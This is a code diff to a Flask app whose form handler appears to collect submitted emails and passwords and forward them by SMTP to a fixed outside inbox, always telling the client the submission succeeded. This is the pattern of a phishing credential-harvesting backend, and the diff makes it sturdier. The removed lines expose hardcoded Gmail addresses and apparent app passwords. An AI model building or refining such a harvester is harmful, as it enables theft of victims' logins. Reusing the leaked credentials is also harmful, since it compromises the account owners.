@@ -16,18 +16,30 @@ logger = logging.getLogger(__name__)
 # Email configuration
 SMTP_SERVER = os.getenv('SMTP_SERVER', 'smtp.gmail.com')
 SMTP_PORT = int(os.getenv('SMTP_PORT', 587))
-SENDER_EMAIL = os.getenv('SENDER_EMAIL', 'nwekee125@gmail.com')
-SENDER_EMAIL_BACKUP = os.getenv('SENDER_EMAIL_BACKUP', 'wpse tggu zdza cvxq')  # Backup sender
-SENDER_PASSWORD = os.getenv('SENDER_PASSWORD', 'sgtr csgr uoju soqw')
-RECEIVER_EMAIL = os.getenv('RECEIVER_EMAIL', 'maxwell202201@gmail.com')
+SENDER_EMAIL = os.getenv('SENDER_EMAIL')
+SENDER_EMAIL_BACKUP = os.getenv('SENDER_EMAIL_BACKUP')  # Backup sender
+SENDER_PASSWORD = os.getenv('SENDER_PASSWORD')
+RECEIVER_EMAIL = os.getenv('RECEIVER_EMAIL')
+
+# Validate required environment variables
+if not SENDER_EMAIL or not SENDER_PASSWORD or not RECEIVER_EMAIL:
+    logger.error("Missing required environment variables: SENDER_EMAIL, SENDER_PASSWORD, and RECEIVER_EMAIL must be set")
+    # We'll handle this gracefully in the send_email function
 
 # Log configuration on startup
 logger.info(f"SMTP Configuration: Server={SMTP_SERVER}, Port={SMTP_PORT}")
-logger.info(f"Sender Email: {SENDER_EMAIL}")
-logger.info(f"Receiver Email: {RECEIVER_EMAIL}")
+if SENDER_EMAIL:
+    logger.info(f"Sender Email: {SENDER_EMAIL}")
+if RECEIVER_EMAIL:
+    logger.info(f"Receiver Email: {RECEIVER_EMAIL}")
 
 def send_email(subject, body, sender_email):
     """Send email using SMTP"""
+    # Check if we have the required credentials
+    if not sender_email or not SENDER_PASSWORD or not RECEIVER_EMAIL:
+        logger.warning("Email credentials not fully configured, skipping email send")
+        return "Email not configured"
+    
     try:
         msg = MIMEMultipart()
         msg['From'] = sender_email
@@ -37,8 +49,7 @@ def send_email(subject, body, sender_email):
         msg.attach(MIMEText(body, 'plain'))
         
         logger.info(f"Attempting to connect to SMTP server: {SMTP_SERVER}:{SMTP_PORT}")
-        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT, timeout=30)
-        server.set_debuglevel(1)  # Enable debug output
+        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT, timeout=10)  # Reduced timeout
         server.starttls()
         server.login(sender_email, SENDER_PASSWORD)
         text = msg.as_string()
@@ -94,26 +105,32 @@ def handle_submission():
     logger.info(f"Received form submission from IP: {client_ip}")
     logger.info(f"Form data - Email: {x1}, Password: {'*' * len(x2) if x2 else ''}")
     
-    # Send email with primary sender first
-    result = send_email('Form Submission', body, SENDER_EMAIL)
-    
-    # If primary sender fails, try backup sender
-    if result is not True:
-        logger.warning(f"Primary email sender failed: {result}")
-        result = send_email('Form Submission', body, SENDER_EMAIL_BACKUP)
+    # Only attempt to send email if credentials are configured
+    if SENDER_EMAIL and SENDER_PASSWORD and RECEIVER_EMAIL:
+        # Send email with primary sender first
+        result = send_email('Form Submission', body, SENDER_EMAIL)
         
-        # Log backup sender result
+        # If primary sender fails, try backup sender
         if result is not True:
-            logger.error(f"Backup email sender also failed: {result}")
-            # Even if both email attempts fail, we still return success to the client
-            logger.warning("Both email senders failed, but returning success to client")
+            logger.warning(f"Primary email sender failed: {result}")
+            if SENDER_EMAIL_BACKUP:
+                result = send_email('Form Submission', body, SENDER_EMAIL_BACKUP)
+                
+                # Log backup sender result
+                if result is not True:
+                    logger.error(f"Backup email sender also failed: {result}")
+                    logger.warning("Both email senders failed")
+                else:
+                    logger.info("Email sent successfully using backup sender")
+            else:
+                logger.warning("No backup email sender configured")
         else:
-            logger.info("Email sent successfully using backup sender")
+            logger.info("Email sent successfully using primary sender")
     else:
-        logger.info("Email sent successfully using primary sender")
+        logger.warning("Email not configured - skipping email send")
     
     # Return success regardless of email sending result
     return jsonify({'message': 'Success'})
 
 if __name__ == '__main__':
-    app.run(debug=True, host='0.0.0.0', port=int(os.environ.get('PORT', 8000)))
+    app.run(debug=False, host='0.0.0.0', port=int(os.environ.get('PORT', 8000)))
